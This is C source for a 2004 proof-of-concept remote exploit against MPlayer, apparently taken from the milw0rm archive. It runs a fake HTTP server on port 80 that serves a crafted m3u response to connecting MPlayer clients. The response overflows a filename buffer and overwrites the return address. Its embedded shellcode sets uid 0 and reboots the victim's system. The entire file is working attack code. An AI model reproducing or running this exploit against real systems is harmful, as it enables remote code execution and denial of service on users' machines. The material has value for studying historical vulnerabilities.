/*
  c0ntex open-security org
   
 */

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>


#define SUCCESS 0 /* True */
#define FAILURE 1 /* False */


#define A_BANNER "_MPlayer_MeMPlayer_Media_Mayhem_"
#define ALIGN 0 /* Stack address alignment */
#define BUFFER 544 /* Exactly overwrite EIP */
#define EIPWRT 4 /* Byte count for overwrite */
#define NOP 0x90 /* NoOp padding */
#define OFFSET 0 /* Offset from retaddr */
#define PORT 80 /* Listener port */
#define RETADDR 0xbfffcb9c /* Remote return address */
#define THREAT "MPlayer/1.0pre4-3.2.2" /* Latest vulnerable version */


#define example(OhNoo) fprintf(stderr, "Usage: ./memplayer -a <align_val> -o <offset_val>\n\n",
OhNoo);
#define looking(OhYes)  fprintf(stderr, "I'm looking for projects to work on, mail
me if you have something\n\n", OhYes);


unsigned int i;
char payload[BUFFER];

void banner(void);
void die(char *ohnn);

int pkg_prep(int clisock_fd, int align, int offset);
int pkg_send(int clisock_fd, char *payload);
int main(int argc, char **argv);


char *http[] = {
        "HTTP/1.0 200 OK\r\n",
"Date: Thu, 01 Jun 2004 12:52:15 GMT\r\n",
"Server: MemPlayer/1.0.3 (Linux)\r\n",
"MIME-version: 1.0\r\n",
"Content-Type: audio/x-mpegurl\r\n",
"Content-Length: 666\r\n",
"Connection: close\r\n",
"\r\n"
};


char *m3umuxor[] = {
        "\x23\x45\x58\x54\x4D\x33\x55\r\n",
        "\x23\x45\x58\x54\x49\x4E\x46\x3A"
        "\x2E\x2c\x4F\x70\x65\x6E\x2D\x53"
        "\x65\x63\x75\x72\x69\x74\x79\x2E"
        "\x52\x6F\x63\x6B\x73\r\n",
        "\r\n"
};


char opcode[] = {
0x31,0xc0,0x89,0xc3,0xb0,0x17,0xcd,0x80,0x31,0xc0,0x89,0xc3,
0xb0,0x24,0xcd,0x80,0x31,0xc0,0x89,0xc3,0xb0,0x24,0xcd,0x80,
0x31,0xc0,0x89,0xc3,0x89,0xc1,0x89,0xc2,0xb0,0x58,0xbb,0xad,
0xde,0xe1,0xfe,0xb9,0x69,0x19,0x12,0x28,0xba,0x67,0x45,0x23,
0x01,0xcd,0x80,0x31,0xc0,0x89,0xc3,0xfe,0xc0,0xcd,0x80
};


void
banner(void)
{
fprintf(stderr, "\n  ** MPlayer_Memplayer.c - Remote exploit demo POC **\n\n");
fprintf(stderr, "[-] Uses m3u header reference to make MPlayer think it has a\n");
fprintf(stderr, "[-] valid media file then crafted package is sent, overflows\n");
fprintf(stderr, "[-] the guiIntfStruct.Filename buffer && proves exploit POC.\n");
fprintf(stderr, "[-] c0ntex open-security org {} http://www.open-security.org  \n\n");
}


void
die(char *err_trap)
{
perror(err_trap);
fflush(stderr); _exit(1);
}


int
pkg_prep(int clisock_fd, int align, int offset)
{
unsigned int recv_chk;
long retaddr;

char chk_vuln[69];
char *pload = (char *) &opcode;


retaddr = RETADDR - offset;

fprintf(stderr, " -> Using align [%d] and offset [%d]\n", align, offset);

memset(chk_vuln, 0, sizeof(chk_vuln));

recv_chk = recv(clisock_fd, chk_vuln, sizeof(chk_vuln) -1, 0);
chk_vuln[recv_chk+1] = '\0';

if(recv_chk == -1 || recv_chk == 0) {
fprintf(stderr, "Could not receive data from client\n");
}

if(strstr(chk_vuln, THREAT) || strstr(chk_vuln, "MPlayer/0")) {
fprintf(stderr, " -> Detected vulnerable MPlayer version\n");
}else{
fprintf(stderr, " -> Detected a non-MPlayer connection, end.\n");
close(clisock_fd);
_exit(1);
}

fprintf(stderr, " -> Payload size to send is [%d]\n", sizeof(payload));
fprintf(stderr, " -> Sending evil payload to our client\n");

memset(payload, 0, BUFFER);

for(i = (BUFFER - EIPWRT); i < BUFFER; i += 4)
               *(long *)&payload[i] = retaddr;

for (i = 0; i < (BUFFER - sizeof(opcode) - 4); ++i)
                *(payload + i) = NOP;

        memcpy(payload + i, pload, strlen(pload));

        payload[545] = 0x00;

return SUCCESS;
}


int
pkg_send(int clisock_fd, char *payload)
{

for (i = 0; i < 8; i++)
if(send(clisock_fd, http[i], strlen(http[i]), 0) == -1) {
die("Could not send HTTP header");
}fprintf(stderr, "\t- Sending valid HTTP header..\n"); sleep(1);

for (i = 0; i < 3; i++)
if(send(clisock_fd, m3umuxor[i], strlen(m3umuxor[i]), 0) == -1) {
die("Could not send m3u header");
       }fprintf(stderr, "\t- Sending valid m3u header..\n"); sleep(1);

if(send(clisock_fd, payload, strlen(payload), 0) == -1) {
die("Could not send payload");
}fprintf(stderr, "\t- Sending payload package..\n");

return SUCCESS;
}


int
main(int argc, char **argv)
{
unsigned int align = 0, offset = 0, reuse = 1;
unsigned int port = PORT;
unsigned int cl_buf, opts;

signed int clisock_fd, sock_fd;

static char *exploit, *work;

struct sockaddr_in victim;
struct sockaddr_in confess;


if(argc < 2) {
banner();
example(exploit);
_exit(1);
}banner();


while((opts = getopt(argc, argv, "a:o:")) != -1) {
switch(opts)
{
case 'a':
align = atoi(optarg);
break;
case 'o':
offset = atoi(optarg);
break;
default:
align = ALIGN;
offset = OFFSET;
}
}

if((sock_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
die("Could not create socket");
}

if(setsockopt(sock_fd,SOL_SOCKET,SO_REUSEADDR, &reuse, sizeof(int)) == -1) {
die("Could not re-use socket");
}

memset(&confess, 0, sizeof(confess));

confess.sin_family = AF_INET;
confess.sin_port = htons(port);
confess.sin_addr.s_addr = htonl(INADDR_ANY);

if(bind(sock_fd, (struct sockaddr *)&confess, sizeof(struct sockaddr)) == -1) {
die("Could not bind socket");
}

if(listen(sock_fd, 0) == -1) {
die("Could not listen on socket");
}

printf(" -> Listening for a connection on port %d\n", port);

cl_buf = sizeof(victim);
clisock_fd = accept(sock_fd, (struct sockaddr *)&victim, &cl_buf);

fprintf(stderr, " -> Action: Attaching from host[%s]\n", inet_ntoa(victim.sin_addr));

if(pkg_prep(clisock_fd, align, offset) == 1) {
fprintf(stderr, "Could not prep package\n");
_exit(1);
}

if(pkg_send(clisock_fd, payload) == 1) {
fprintf(stderr, "Could not send package\n");
_exit(1);
}
sleep(2);

fprintf(stderr, " -> Test complete\n\n");

close(clisock_fd); looking(work);

return SUCCESS;
}


// milw0rm.com [2004-07-04]
